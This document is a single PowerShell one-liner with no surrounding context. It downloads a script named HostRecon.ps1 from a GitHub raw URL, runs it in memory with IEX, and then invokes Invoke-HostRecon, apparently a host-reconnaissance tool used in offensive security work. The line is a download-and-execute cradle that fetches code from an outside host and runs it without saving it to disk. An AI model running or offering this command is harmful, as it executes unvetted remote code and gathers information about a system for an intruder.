IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1’) ; Invoke-HostRecon
